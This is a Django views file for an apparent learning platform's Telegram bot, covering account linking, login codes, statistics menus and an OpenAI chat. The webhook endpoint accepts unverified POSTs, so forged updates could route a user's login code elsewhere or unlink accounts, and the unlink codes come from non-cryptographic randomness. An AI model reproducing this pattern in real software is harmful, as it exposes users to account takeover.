import json
import logging
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
from django.views.decorators.http import require_POST
from django.shortcuts import redirect
from django.contrib.auth.decorators import login_required
from django.contrib import messages

from django.shortcuts import render
from django.core.paginator import Paginator
from django.db.models import Q

from accounts.models import CustomUser
from .models import TelegramLoginCode, TelegramLinkToken, TelegramMessageLog, ContactMessage, TelegramBroadcastMessage

logger = logging.getLogger(__name__)


@login_required
def link_telegram(request):
    """Profildan Telegramni ulash — tokenli link yaratib botga yo'naltirish"""
    from django.conf import settings

    # Agar allaqachon ulangan bo'lsa
    if request.user.telegram_id:
        messages.info(request, "Telegram allaqachon ulangan! ✅")
        return redirect('profile')

    # Yangi token yaratish
    token = TelegramLinkToken.generate_token()
    TelegramLinkToken.objects.create(user=request.user, token=token)

    bot_username = getattr(settings, 'TELEGRAM_BOT_USERNAME', '')
    if not bot_username:
        messages.error(request, "Telegram bot sozlanmagan!")
        return redirect('profile')

    # Botga deep link bilan yo'naltirish
    telegram_url = f"https://t.me/{bot_username}?start=link_{token}"
    return redirect(telegram_url)


@login_required
def unlink_telegram(request):
    """Telegramni uzish — tasdiqlash kodi yuborish"""
    if request.method != 'POST':
        return redirect('profile')

    if not request.user.telegram_id:
        messages.error(request, "Telegram ulanmagan!")
        return redirect('profile')

    import random
    from django.core.cache import cache
    from .utils import notify_user

    code = ''.join([str(random.randint(0, 9)) for _ in range(6)])
    cache_key = f'tg_unlink_code_{request.user.id}'
    cache.set(cache_key, code, 300)  # 5 daqiqa

    notify_user(
        request.user.telegram_id,
        f"🔐 <b>Telegram uzish kodi</b>\n\n"
        f"Sizning tasdiqlash kodingiz:\n\n"
        f"<code>{code}</code>\n\n"
        f"⏱ Kod 5 daqiqa ichida amal qiladi.\n"
        f"❗ Agar siz so'ramagan bo'lsangiz, e'tiborsiz qoldiring."
    )

    # AJAX so'rov bo'lsa JSON qaytarish
    if request.headers.get('X-Requested-With') == 'XMLHttpRequest':
        return JsonResponse({'ok': True, 'message': 'Kod yuborildi'})

    messages.info(request, "Tasdiqlash kodi Telegram ga yuborildi! ✅")
    return redirect('profile')


@login_required
@require_POST
def confirm_unlink_telegram(request):
    """Telegramni uzish — kodni tasdiqlash"""
    from django.core.cache import cache

    if not request.user.telegram_id:
        messages.error(request, "Telegram ulanmagan!")
        return redirect('profile')

    code = request.POST.get('unlink_code', '').strip()
    if not code:
        messages.error(request, "Kodni kiriting!")
        return redirect('profile')

    cache_key = f'tg_unlink_code_{request.user.id}'
    correct_code = cache.get(cache_key)

    if not correct_code:
        messages.error(request, "Kod muddati tugagan! Qaytadan urinib ko'ring.")
        return redirect('profile')

    if code != correct_code:
        messages.error(request, "Kod noto'g'ri!")
        return redirect('profile')

    # Kod to'g'ri — uzish
    cache.delete(cache_key)
    request.user.telegram_id = None
    request.user.telegram_username = None
    request.user.save(update_fields=['telegram_id', 'telegram_username'])
    messages.success(request, "Telegram muvaffaqiyatli uzildi! 🔓")
    return redirect('profile')


def set_webhook(request):
    """Telegram webhook ni o'rnatish"""
    try:
        import requests as http_requests
        from django.conf import settings
        from django.urls import reverse

        bot_token = getattr(settings, 'TELEGRAM_BOT_TOKEN', '')
        if not bot_token:
            return JsonResponse({'ok': False, 'error': 'TELEGRAM_BOT_TOKEN sozlanmagan'})

        site_url = getattr(settings, 'SITE_URL', 'https://itc-academy.uz').rstrip('/')
        webhook_path = reverse('telegram_bot:bot_webhook')
        webhook_url = f"{site_url}{webhook_path}"

        url = f"https://api.telegram.org/bot{bot_token}/setWebhook"
        resp = http_requests.post(url, json={'url': webhook_url}, timeout=15)
        result = resp.json()
        result['webhook_url'] = webhook_url
        return JsonResponse(result)
    except Exception as e:
        return JsonResponse({'ok': False, 'error': str(e)})


def bot_health(request):
    """Health check — serverni uyg'oq tutish uchun + musobaqa eslatmalari + vazifa eslatmalari"""
    try:
        from telegram_bot.utils import notify_competition_reminder
        notify_competition_reminder()
    except Exception:
        pass
    try:
        from telegram_bot.utils import notify_unchecked_homework
        notify_unchecked_homework()
    except Exception:
        pass
    try:
        from telegram_bot.utils import notify_payment_reminders
        notify_payment_reminders()
    except Exception:
        pass
    return JsonResponse({'status': 'ok', 'bot': 'alive'})


@csrf_exempt
@require_POST
def bot_webhook(request):
    """Telegram bot webhook — botdan kelgan xabarlarni qayta ishlash"""
    try:
        data = json.loads(request.body)
    except json.JSONDecodeError:
        return JsonResponse({'ok': False})

    # Darhol javob qaytarish — Telegram kutmasin
    import threading
    threading.Thread(target=_process_webhook, args=(data,), daemon=True).start()
    return JsonResponse({'ok': True})


def _process_webhook(data):
    """Webhook update ni background threadda qayta ishlash"""
    import django
    django.db.connections.close_all()

    message = data.get('message', {})
    if not message:
        return

    text = message.get('text', '')
    caption = message.get('caption', '')
    photo = message.get('photo')
    chat = message.get('chat', {})
    user_data = message.get('from', {})
    telegram_id = user_data.get('id')
    tg_username = user_data.get('username', '')

    if not telegram_id:
        return

    from django.conf import settings
    bot_token = getattr(settings, 'TELEGRAM_BOT_TOKEN', '')

    if not bot_token:
        logger.error("TELEGRAM_BOT_TOKEN sozlanmagan!")
        return

    # Guruhda tugmalar ishlamasin — faqat shaxsiy chatda
    chat_type = chat.get('type', 'private')
    if chat_type in ('group', 'supergroup'):
        return

    if text.startswith('/start'):
        parts = text.split()
        if len(parts) > 1 and parts[1].startswith('link_'):
            token_value = parts[1][5:]
            _handle_link(chat['id'], telegram_id, tg_username, token_value, bot_token)
        else:
            _handle_start(chat['id'], telegram_id, tg_username, bot_token)
        return

    if text == '🤖 AI Chat':
        try:
            user = CustomUser.objects.get(telegram_id=telegram_id)
        except CustomUser.DoesNotExist:
            _send_message(bot_token, chat['id'], "❌ AI Chat ishlatish uchun avval Telegram akkauntingizni tizimga ulang!")
            return

        from .models import TelegramChatState
        from ai_yordamchi.models import ChatSession

        chat_state, _ = TelegramChatState.objects.get_or_create(telegram_id=telegram_id)
        if chat_state.ai_session and chat_state.ai_session.is_active:
            session = chat_state.ai_session
        else:
            session = ChatSession.objects.create(user=user, title="Telegram AI Chat")
            chat_state.ai_session = session
        chat_state.is_ai_chat = True
        chat_state.save()

        keyboard = {
            'keyboard': [
                [{'text': '🔄 Yangi suhbat'}, {'text': '📊 Limitlarim'}],
                [{'text': '🔙 Orqaga'}],
            ],
            'resize_keyboard': True,
        }
        _send_message_with_reply_markup(
            bot_token, chat['id'],
            "🤖 <b>AI Chat rejimi yoqildi!</b>\n\n"
            "Xabaringizni yozing va AI javob beradi.\n"
            "Orqaga qaytish uchun 🔙 Orqaga tugmasini bosing.",
            keyboard,
        )
        return

    if text == '🔄 Yangi suhbat':
        try:
            user = CustomUser.objects.get(telegram_id=telegram_id)
        except CustomUser.DoesNotExist:
            _send_message(bot_token, chat['id'], "❌ Akkaunt topilmadi!")
            return

        from .models import TelegramChatState
        from ai_yordamchi.models import ChatSession

        chat_state, _ = TelegramChatState.objects.get_or_create(telegram_id=telegram_id)
        session = ChatSession.objects.create(user=user, title="Telegram AI Chat")
        chat_state.ai_session = session
        chat_state.is_ai_chat = True
        chat_state.save()

        keyboard = {
            'keyboard': [
                [{'text': '🔄 Yangi suhbat'}, {'text': '📊 Limitlarim'}],
                [{'text': '🔙 Orqaga'}],
            ],
            'resize_keyboard': True,
        }
        _send_message_with_reply_markup(
            bot_token, chat['id'],
            "🔄 <b>Yangi suhbat boshlandi!</b>\n\nXabaringizni yozing.",
            keyboard,
        )
        return

    if text == '📊 Limitlarim':
        try:
            user = CustomUser.objects.get(telegram_id=telegram_id)
        except CustomUser.DoesNotExist:
            _send_message(bot_token, chat['id'], "❌ Akkaunt topilmadi!")
            return

        from ai_yordamchi.views import get_user_limits
        limits = get_user_limits(user)
        is_premium = limits['is_premium']

        msg = (
            "📊 <b>Sizning limitlaringiz</b>\n\n"
            f"👤 {user.full_name}\n"
            f"💎 Status: <b>{'Premium' if is_premium else 'Oddiy'}</b>\n\n"
            f"💬 <b>Xabar limiti:</b>\n"
            f"   Ishlatilgan: {limits['msg_used']} / {limits['msg_limit']}\n"
            f"   Qolgan: <b>{limits['msg_left']}</b> ta\n\n"
            f"🖼 <b>Rasm limiti:</b>\n"
            f"   Ishlatilgan: {limits['img_used']} / {limits['img_limit']}\n"
            f"   Qolgan: <b>{limits['img_left']}</b> ta\n\n"
            f"🪙 <b>Coin:</b> {user.coins}\n"
        )
        if not is_premium:
            msg += "\n💡 Har bir xabar 1 coin sarflaydi."

        keyboard = {
            'keyboard': [
                [{'text': '🔄 Yangi suhbat'}, {'text': '📊 Limitlarim'}],
                [{'text': '🔙 Orqaga'}],
            ],
            'resize_keyboard': True,
        }
        _send_message_with_reply_markup(bot_token, chat['id'], msg, keyboard)
        return

    if text == '✉️ Xabar yozish':
        from .models import TelegramChatState
        chat_state, _ = TelegramChatState.objects.get_or_create(telegram_id=telegram_id)
        chat_state.is_contact_mode = True
        chat_state.is_ai_chat = False
        chat_state.save(update_fields=['is_contact_mode', 'is_ai_chat'])

        keyboard = {
            'keyboard': [
                [{'text': '🔙 Orqaga'}],
            ],
            'resize_keyboard': True,
        }
        _send_message_with_reply_markup(
            bot_token, chat['id'],
            "✍️ Xabaringizni yozing:",
            keyboard,
        )
        return

    if text == '🔙 Orqaga':
        from .models import TelegramChatState
        TelegramChatState.objects.filter(telegram_id=telegram_id).update(is_ai_chat=False, is_contact_mode=False)
        try:
            user = CustomUser.objects.get(telegram_id=telegram_id)
            _send_message_with_reply_markup(
                bot_token, chat['id'],
                f"👋 Asosiy menyu, {user.first_name}!",
                _linked_keyboard(),
            )
        except CustomUser.DoesNotExist:
            _send_message_with_reply_markup(
                bot_token, chat['id'],
                "👋 Asosiy menyu",
                _unlinked_keyboard(),
            )
        return

    # ===== KITOBLAR, XABARLAR, UZISH =====
    if text == '📬 Xabarlarim':
        try:
            user = CustomUser.objects.get(telegram_id=telegram_id)
        except CustomUser.DoesNotExist:
            _send_message(bot_token, chat['id'], "❌ Akkaunt ulanmagan!")
            return
        _send_user_messages(bot_token, chat['id'], user)
        return

    if text == '📚 Kitoblarim':
        try:
            user = CustomUser.objects.get(telegram_id=telegram_id)
        except CustomUser.DoesNotExist:
            _send_message(bot_token, chat['id'], "❌ Akkaunt ulanmagan!")
            return
        _send_user_books(bot_token, chat['id'], user)
        return

    if text == '🔓 Uzish':
        try:
            user = CustomUser.objects.get(telegram_id=telegram_id)
        except CustomUser.DoesNotExist:
            _send_message(bot_token, chat['id'], "❌ Telegram akkauntingiz tizimga ulanmagan!")
            return
        keyboard = {
            'keyboard': [
                [{'text': '✅ Ha, uzilsin'}, {'text': '❌ Bekor qilish'}],
            ],
            'resize_keyboard': True,
            'one_time_keyboard': True,
        }
        _send_message_with_reply_markup(
            bot_token, chat['id'],
            f"⚠️ <b>Telegramni uzmoqchimisiz?</b>\n\n"
            f"👤 {user.first_name} {user.last_name}\n\n"
            f"Uzilgandan so'ng bot orqali login qila olmaysiz.",
            keyboard,
        )
        return

    if text == '✅ Ha, uzilsin':
        try:
            user = CustomUser.objects.get(telegram_id=telegram_id)
        except CustomUser.DoesNotExist:
            _send_message(bot_token, chat['id'], "❌ Akkaunt ulanmagan!")
            return
        user.telegram_id = None
        user.telegram_username = None
        user.save(update_fields=['telegram_id', 'telegram_username'])
        _send_message_with_reply_markup(
            bot_token, chat['id'],
            "✅ Telegram muvaffaqiyatli uzildi!",
            {'remove_keyboard': True},
        )
        return

    if text == '❌ Bekor qilish':
        _send_message_with_reply_markup(
            bot_token, chat['id'],
            "👌 Bekor qilindi. Telegram ulangan holda qoldi.",
            _linked_keyboard(),
        )
        return

    # ===== COIN STATISTIKA =====
    # Eski keyboard dan kelgan matnlar ham qo'llab-quvvatlanadi
    if text == '💰 Coinlarim':
        text = '💰 Coin statistika'
    if text == '📊 Statistika':
        text = '📊 Ball statistika'

    if text == '💰 Coin statistika':
        try:
            user = CustomUser.objects.get(telegram_id=telegram_id)
        except CustomUser.DoesNotExist:
            _send_message(bot_token, chat['id'], "❌ Akkaunt ulanmagan!")
            return

        from accounts.models import CourseEnrollment
        enrollments = CourseEnrollment.objects.filter(user=user).select_related('profession')
        keyboard_buttons = [[{'text': '💰 Barcha coinlar'}]]
        for e in enrollments:
            keyboard_buttons.append([{'text': f'💰 {e.profession.name}'}])
        keyboard_buttons.append([{'text': '🔙 Orqaga'}])

        _send_message_with_reply_markup(
            bot_token, chat['id'],
            "💰 <b>Coin statistika</b>\n\nQaysi kurs bo'yicha ko'rmoqchisiz?",
            {'keyboard': keyboard_buttons, 'resize_keyboard': True},
        )
        return

    if text == '💰 Barcha coinlar':
        try:
            user = CustomUser.objects.get(telegram_id=telegram_id)
        except CustomUser.DoesNotExist:
            _send_message(bot_token, chat['id'], "❌ Akkaunt ulanmagan!")
            return

        _send_coin_stats(bot_token, chat['id'], user, profession=None)
        return

    if text.startswith('💰 ') and text != '💰 Coin statistika' and text != '💰 Barcha coinlar':
        try:
            user = CustomUser.objects.get(telegram_id=telegram_id)
        except CustomUser.DoesNotExist:
            _send_message(bot_token, chat['id'], "❌ Akkaunt ulanmagan!")
            return

        from accounts.models import Profession
        profession_name = text[2:].strip()
        profession = Profession.objects.filter(name=profession_name).first()
        if profession:
            _send_coin_stats(bot_token, chat['id'], user, profession=profession)
        else:
            _send_message(bot_token, chat['id'], "❌ Kurs topilmadi!")
        return

    # ===== BALL STATISTIKA =====
    if text == '📊 Ball statistika':
        try:
            user = CustomUser.objects.get(telegram_id=telegram_id)
        except CustomUser.DoesNotExist:
            _send_message(bot_token, chat['id'], "❌ Akkaunt ulanmagan!")
            return

        from accounts.models import CourseEnrollment
        enrollments = CourseEnrollment.objects.filter(user=user).select_related('profession')
        keyboard_buttons = [[{'text': '📊 Barcha ballar'}]]
        for e in enrollments:
            keyboard_buttons.append([{'text': f'📊 {e.profession.name}'}])
        keyboard_buttons.append([{'text': '🔙 Orqaga'}])

        _send_message_with_reply_markup(
            bot_token, chat['id'],
            "📊 <b>Ball statistika</b>\n\nQaysi kurs bo'yicha ko'rmoqchisiz?",
            {'keyboard': keyboard_buttons, 'resize_keyboard': True},
        )
        return

    if text == '📊 Barcha ballar':
        try:
            user = CustomUser.objects.get(telegram_id=telegram_id)
        except CustomUser.DoesNotExist:
            _send_message(bot_token, chat['id'], "❌ Akkaunt ulanmagan!")
            return

        _send_ball_stats(bot_token, chat['id'], user, profession=None)
        return

    if text.startswith('📊 ') and text != '📊 Ball statistika' and text != '📊 Barcha ballar' and text != '📊 Limitlarim':
        try:
            user = CustomUser.objects.get(telegram_id=telegram_id)
        except CustomUser.DoesNotExist:
            _send_message(bot_token, chat['id'], "❌ Akkaunt ulanmagan!")
            return

        from accounts.models import Profession
        profession_name = text[2:].strip()
        profession = Profession.objects.filter(name=profession_name).first()
        if profession:
            _send_ball_stats(bot_token, chat['id'], user, profession=profession)
        else:
            _send_message(bot_token, chat['id'], "❌ Kurs topilmadi!")
        return

    # AI Chat rejimida rasm yuborilsa
    if photo:
        from .models import TelegramChatState
        chat_state = TelegramChatState.objects.filter(telegram_id=telegram_id, is_ai_chat=True).first()
        if chat_state:
            _handle_ai_chat_image(bot_token, chat['id'], telegram_id, caption or '', photo, chat_state)
            return

    # AI Chat rejimida bo'lsa — xabarni AI ga yuborish
    if text and not text.startswith('/'):
        from .models import TelegramChatState
        chat_state = TelegramChatState.objects.filter(telegram_id=telegram_id, is_ai_chat=True).first()
        if chat_state:
            _handle_ai_chat_message(bot_token, chat['id'], telegram_id, text, chat_state)
            return

    # Xabar yozish rejimida bo'lsa — aloqa xabari sifatida saqlash
    if text and not text.startswith('/'):
        from .models import TelegramChatState
        chat_state = TelegramChatState.objects.filter(telegram_id=telegram_id, is_contact_mode=True).first()
        if chat_state:
            first_name = user_data.get('first_name', '')
            last_name = user_data.get('last_name', '')
            tg_full = f"{first_name} {last_name}".strip()
            linked_user = CustomUser.objects.filter(telegram_id=telegram_id).first()

            ContactMessage.objects.create(
                name=tg_full or f"TG:{telegram_id}",
                phone='',
                email='',
                subject='Telegram xabar',
                message=text,
                user=linked_user,
            )

            _notify_admin_telegram_message(bot_token, tg_full, tg_username, telegram_id, text)

            chat_state.is_contact_mode = False
            chat_state.save(update_fields=['is_contact_mode'])

            _send_message(
                bot_token, chat['id'],
                "✅ Xabaringiz adminga yuborildi! Tez orada javob olasiz."
            )


def _handle_start(chat_id, telegram_id, tg_username, bot_token):
    """Login kod yaratish va yuborish"""
    import requests

    # Foydalanuvchi ulangan mi?
    try:
        user = CustomUser.objects.get(telegram_id=telegram_id)
    except CustomUser.DoesNotExist:
        _send_message_with_reply_markup(
            bot_token, chat_id,
            "👋 Xush kelibsiz!\n\n"
            "📱 Sizning Telegram akkauntingiz tizimga ulanmagan.\n"
            "Saytda profilingizga kirib \"Telegramni ulash\" tugmasini bosing.\n\n"
            "✉️ Adminga xabar yozish uchun quyidagi tugmani bosing:",
            _unlinked_keyboard(),
        )
        return

    # Eski kodlarni o'chirish
    TelegramLoginCode.objects.filter(telegram_id=telegram_id, is_used=False).delete()

    # Yangi kod yaratish
    code = TelegramLoginCode.generate_code()
    TelegramLoginCode.objects.create(telegram_id=telegram_id, code=code)

    _send_message_with_reply_markup(
        bot_token, chat_id,
        f"🔐 Sizning login kodingiz:\n\n"
        f"<b>📌 {code}</b>\n\n"
        f"👤 Foydalanuvchi: {user.full_name}\n"
        f"⏱ Kod 5 daqiqa amal qiladi.\n\n"
        f"💡 Bu kodni saytdagi login sahifasiga kiriting.",
        _linked_keyboard(),
    )


def _handle_link(chat_id, telegram_id, tg_username, token_value, bot_token):
    """Telegramni foydalanuvchiga ulash"""
    # Allaqachon boshqa akkauntga ulangan bo'lsa
    if CustomUser.objects.filter(telegram_id=telegram_id).exists():
        _send_message(
            bot_token, chat_id,
            "⚠️ Bu Telegram akkaunt allaqachon boshqa foydalanuvchiga ulangan!"
        )
        return

    # Tokenni tekshirish
    try:
        link_token = TelegramLinkToken.objects.get(token=token_value, is_used=False)
    except TelegramLinkToken.DoesNotExist:
        _send_message(
            bot_token, chat_id,
            "❌ Havola eskirgan yoki noto'g'ri. Iltimos, qaytadan urinib ko'ring."
        )
        return

    if link_token.is_expired:
        _send_message(
            bot_token, chat_id,
            "⏰ Havola muddati tugagan. Iltimos, saytdan qayta ulang."
        )
        return

    # Ulash
    user = link_token.user
    user.telegram_id = telegram_id
    user.telegram_username = tg_username
    user.save(update_fields=['telegram_id', 'telegram_username'])

    link_token.is_used = True
    link_token.save()

    _send_message(
        bot_token, chat_id,
        f"✅ Telegram muvaffaqiyatli ulandi!\n\n"
        f"👤 {user.full_name} (@{user.username})\n\n"
        f"Endi login qilish uchun /start bosing va kodni oling."
    )


def _unlinked_keyboard():
    return {
        'keyboard': [
            [{'text': '✉️ Xabar yozish'}],
        ],
        'resize_keyboard': True,
    }


def _linked_keyboard():
    return {
        'keyboard': [
            [{'text': '💰 Coin statistika'}, {'text': '📊 Ball statistika'}],
            [{'text': '📚 Kitoblarim'}, {'text': '📬 Xabarlarim'}],
            [{'text': '🤖 AI Chat'}, {'text': '✉️ Xabar yozish'}],
        ],
        'resize_keyboard': True,
    }


def _send_message(bot_token, chat_id, text):
    """Telegram API orqali xabar yuborish (premium custom emoji bilan)"""
    from telegram_bot import premium
    try:
        resp = premium.send_message(bot_token, chat_id, text)
        if resp is not None and not resp.json().get('ok'):
            logger.error(f"sendMessage xatolik: {resp.text}")
    except Exception as e:
        logger.error(f"sendMessage exception: {e}")


def _send_message_with_reply_markup(bot_token, chat_id, text, reply_markup):
    """Telegram API orqali keyboard bilan xabar yuborish (premium custom emoji bilan)"""
    from telegram_bot import premium
    try:
        resp = premium.send_message(bot_token, chat_id, text, reply_markup=reply_markup)
        if resp is not None and not resp.json().get('ok'):
            logger.error(f"sendMessage xatolik: {resp.text}")
    except Exception as e:
        logger.error(f"sendMessage exception: {e}")


def _handle_ai_chat_message(bot_token, chat_id, telegram_id, text, chat_state):
    """AI Chat xabarini qayta ishlash (webhook versiya)"""
    from ai_yordamchi.models import ChatSession, ChatMessage
    from ai_yordamchi.views import get_user_limits
    from coin.models import CoinTransaction
    from django.conf import settings

    user = CustomUser.objects.filter(telegram_id=telegram_id).first()
    if not user:
        _send_message(bot_token, chat_id, "❌ Akkaunt topilmadi!")
        return

    # Limit tekshirish
    is_premium = getattr(user, 'is_premium', False)
    limits = get_user_limits(user)

    if not is_premium and user.coins < 1:
        _send_message(bot_token, chat_id,
            "❌ Sizda yetarli coin yo'q.\n"
            "AI bilan suhbatlashish uchun 1 coin kerak.")
        return

    if limits['msg_left'] <= 0:
        limit_text = "120" if is_premium else "60"
        _send_message(bot_token, chat_id,
            f"❌ Kunlik xabar limitingiz tugadi ({limit_text}/{limit_text}).\n"
            f"Ertaga qayta urinib ko'ring.")
        return

    session = chat_state.ai_session
    if not session or not session.is_active:
        session = ChatSession.objects.create(user=user, title="Telegram AI Chat")
        chat_state.ai_session = session
        chat_state.save()

    # Foydalanuvchi xabarini saqlash
    coin_cost = 0 if is_premium else 1
    ChatMessage.objects.create(
        session=session,
        role='user',
        content=text,
        coins_spent=coin_cost,
    )

    # Coin ayirish (faqat premium bo'lmaganlar uchun)
    if not is_premium:
        user.coins -= 1
        user.save(update_fields=['coins'])
        CoinTransaction.objects.create(
            user=user,
            amount=1,
            action='remove',
            reason="AI yordamchi bilan suhbat (Telegram)"
        )

    # Sessiya sarlavhasini yangilash
    if session.messages.filter(role='user').count() == 1:
        session.title = f"TG: {text[:45]}..." if len(text) > 45 else f"TG: {text}"
        session.save()

    # OpenAI ga yuborish
    api_key = getattr(settings, 'OPENAI_API_KEY', None)
    if not api_key or not api_key.strip():
        ai_response = "⚠️ AI xizmati hozirda mavjud emas. Keyinroq urinib ko'ring."
    else:
        try:
            from openai import OpenAI
            client = OpenAI(api_key=api_key.strip(), timeout=30)

            system_prompt = (
                "Siz LMS o'quv platformasining AI yordamchisisiz. O'zbek tilida javob bering. "
                "Qisqa va aniq javoblar bering. Telegram formatida javob bering (HTML format: "
                "Sizni Husan Suyunov Shavkat o'g'li yaratgan husanbek-coder.uz phone: +998975216686"
                "Husan Suyunov IT Creative Academy asoschisi."

                "<b>qalin</b>, <i>kursiv</i>, <code>kod</code>, <pre>kod bloki</pre>). "
                "Markdown formatini ISHLATMANG. Faqat HTML teglarini ishlating."
            )

            history = [{"role": "system", "content": system_prompt}]

            recent_messages = list(session.messages.order_by('-created_at')[:10])
            recent_messages.reverse()
            for msg in recent_messages:
                history.append({"role": msg.role, "content": msg.content})

            response = client.chat.completions.create(
                model="gpt-4o-mini",
                messages=history,
                max_tokens=2048,
                temperature=0.7,
            )
            ai_response = response.choices[0].message.content
        except Exception as e:
            ai_response = "⚠️ AI bilan bog'lanishda xatolik yuz berdi. Keyinroq urinib ko'ring."

    # AI javobini saqlash
    ChatMessage.objects.create(
        session=session,
        role='assistant',
        content=ai_response,
    )

    _send_message(bot_token, chat_id, ai_response)


def _handle_ai_chat_image(bot_token, chat_id, telegram_id, caption, photo, chat_state):
    """AI Chat rasmli xabarni qayta ishlash (webhook versiya)"""
    import base64
    import requests
    from ai_yordamchi.models import ChatSession, ChatMessage
    from ai_yordamchi.views import get_user_limits
    from coin.models import CoinTransaction
    from django.conf import settings

    user = CustomUser.objects.filter(telegram_id=telegram_id).first()
    if not user:
        _send_message(bot_token, chat_id, "❌ Akkaunt topilmadi!")
        return

    is_premium = getattr(user, 'is_premium', False)
    limits = get_user_limits(user)

    if not is_premium and user.coins < 1:
        _send_message(bot_token, chat_id, "❌ Sizda yetarli coin yo'q.\nAI bilan suhbatlashish uchun 1 coin kerak.")
        return
    if limits['msg_left'] <= 0:
        limit_text = "120" if is_premium else "60"
        _send_message(bot_token, chat_id, f"❌ Kunlik xabar limitingiz tugadi ({limit_text}/{limit_text}).\nErtaga qayta urinib ko'ring.")
        return
    if limits['img_left'] <= 0:
        img_text = "5" if is_premium else "3"
        _send_message(bot_token, chat_id, f"❌ Kunlik rasm limitingiz tugadi ({img_text}/{img_text}).\nErtaga qayta urinib ko'ring.")
        return

    session = chat_state.ai_session
    if not session or not session.is_active:
        session = ChatSession.objects.create(user=user, title="Telegram AI Chat")
        chat_state.ai_session = session
        chat_state.save()

    # Telegram'dan rasmni yuklab olish
    file_id = photo[-1]['file_id']
    try:
        file_resp = requests.get(
            f"https://api.telegram.org/bot{bot_token}/getFile",
            params={'file_id': file_id}, timeout=10
        )
        file_path = file_resp.json()['result']['file_path']
        img_resp = requests.get(
            f"https://api.telegram.org/file/bot{bot_token}/{file_path}", timeout=15
        )
        image_data = base64.b64encode(img_resp.content).decode('utf-8')
    except Exception:
        _send_message(bot_token, chat_id, "❌ Rasmni yuklab olishda xatolik yuz berdi.")
        return

    mime = 'image/png' if file_path.endswith('.png') else 'image/gif' if file_path.endswith('.gif') else 'image/webp' if file_path.endswith('.webp') else 'image/jpeg'

    user_text = caption or "[Rasm yuborildi]"
    coin_cost = 0 if is_premium else 1
    ChatMessage.objects.create(session=session, role='user', content=user_text, coins_spent=coin_cost)

    if not is_premium:
        user.coins -= 1
        user.save(update_fields=['coins'])
        CoinTransaction.objects.create(user=user, amount=1, action='remove', reason="AI yordamchi bilan suhbat - rasm (Telegram)")

    if session.messages.filter(role='user').count() == 1:
        title = caption[:45] if caption else "Rasm tahlili"
        session.title = f"TG: {title}"
        session.save()

    api_key = getattr(settings, 'OPENAI_API_KEY', None)
    if not api_key or not api_key.strip():
        ai_response = "⚠️ AI xizmati hozirda mavjud emas."
    else:
        try:
            from openai import OpenAI
            client = OpenAI(api_key=api_key.strip(), timeout=60)

            system_prompt = (
                "Siz LMS o'quv platformasining AI yordamchisisiz. O'zbek tilida javob bering. "
                "Rasmlarni tahlil qiling va tushuntiring. "
                "Telegram formatida javob bering (HTML format: "
                "<b>qalin</b>, <i>kursiv</i>, <code>kod</code>, <pre>kod bloki</pre>). "
                "Markdown formatini ISHLATMANG. Faqat HTML teglarini ishlating."
            )

            content_parts = []
            if caption:
                content_parts.append({"type": "text", "text": caption})
            else:
                content_parts.append({"type": "text", "text": "Bu rasmni tahlil qiling va tushuntiring."})
            content_parts.append({
                "type": "image_url",
                "image_url": {"url": f"data:{mime};base64,{image_data}", "detail": "high"}
            })

            response = client.chat.completions.create(
                model="gpt-4o-mini",
                messages=[
                    {"role": "system", "content": system_prompt},
                    {"role": "user", "content": content_parts}
                ],
                max_tokens=2048, temperature=0.7,
            )
            ai_response = response.choices[0].message.content
        except Exception:
            ai_response = "⚠️ Rasmni tahlil qilishda xatolik yuz berdi."

    ChatMessage.objects.create(session=session, role='assistant', content=ai_response)
    _send_message(bot_token, chat_id, ai_response)


def _send_coin_stats(bot_token, chat_id, user, profession=None):
    """Coin statistikasini yuborish"""
    from django.db.models import Sum
    from coin.models import CoinTransaction

    qs = CoinTransaction.objects.filter(user=user)
    title = "💰 <b>Coin statistika — Barcha</b>"

    if profession:
        qs = qs.filter(reason__icontains=profession.name)
        title = f"💰 <b>Coin statistika — {profession.name}</b>"

    earned = qs.filter(action='add').aggregate(t=Sum('amount'))['t'] or 0
    spent = qs.filter(action__in=['remove', 'purchase']).aggregate(t=Sum('amount'))['t'] or 0

    msg = (
        f"{title}\n\n"
        f"👤 {user.full_name}\n\n"
        f"💳 Joriy balans: <b>{user.coins}</b> coin\n"
        f"📈 Jami yig'ilgan: <b>{earned}</b> coin\n"
        f"📉 Sarflangan: <b>{spent}</b> coin\n"
    )

    # Oxirgi 5 ta tranzaksiya
    recent = qs.order_by('-created_at')[:5]
    if recent.exists():
        msg += "\n📋 <b>Oxirgi tranzaksiyalar:</b>\n"
        for t in recent:
            sign = '+' if t.action == 'add' else '-'
            msg += f"  {sign}{t.amount} coin — {t.reason or t.get_action_display()}\n"

    _send_message_with_reply_markup(bot_token, chat_id, msg, _linked_keyboard())


def _send_ball_stats(bot_token, chat_id, user, profession=None):
    """Ball statistikasini yuborish"""
    from django.db.models import Avg, Count
    from accounts.models import TestResult, HomeworkSubmission, Lesson

    title = "📊 <b>Ball statistika — Barcha</b>"

    test_qs = TestResult.first_attempts().filter(student=user)
    hw_qs = HomeworkSubmission.objects.filter(student=user)

    if profession:
        title = f"📊 <b>Ball statistika — {profession.name}</b>"
        lesson_ids = Lesson.objects.filter(profession=profession).values_list('id', flat=True)
        test_qs = test_qs.filter(test__lesson_id__in=lesson_ids)
        hw_qs = hw_qs.filter(homework__lesson_id__in=lesson_ids)

    total_tests = test_qs.count()
    avg_score = round(test_qs.aggregate(avg=Avg('score'))['avg'] or 0, 1)
    passed_tests = test_qs.filter(passed=True).count()

    total_hw = hw_qs.count()
    graded_hw = hw_qs.filter(grade__isnull=False)
    avg_grade = round(graded_hw.aggregate(avg=Avg('grade'))['avg'] or 0, 1)
    accepted_hw = hw_qs.filter(status__in=['accepted', 'graded']).count()

    msg = (
        f"{title}\n\n"
        f"👤 {user.full_name}\n\n"
        f"📝 <b>Testlar:</b>\n"
        f"  📋 Topshirilgan: <b>{total_tests}</b>\n"
        f"  ✅ O'tgan: <b>{passed_tests}</b>\n"
        f"  📈 O'rtacha ball: <b>{avg_score}%</b>\n\n"
        f"📄 <b>Vazifalar:</b>\n"
        f"  📋 Topshirilgan: <b>{total_hw}</b>\n"
        f"  ✅ Qabul qilingan: <b>{accepted_hw}</b>\n"
        f"  ⭐ O'rtacha baho: <b>{avg_grade}/10</b>\n"
    )

    # Oxirgi 5 test natijasi
    recent_tests = test_qs.select_related('test__lesson').order_by('-completed_at')[:5]
    if recent_tests.exists():
        msg += "\n📋 <b>Oxirgi test natijalari:</b>\n"
        for r in recent_tests:
            emoji = '✅' if r.passed else '❌'
            msg += f"  {emoji} {r.test.lesson.title}: <b>{r.score}%</b>\n"

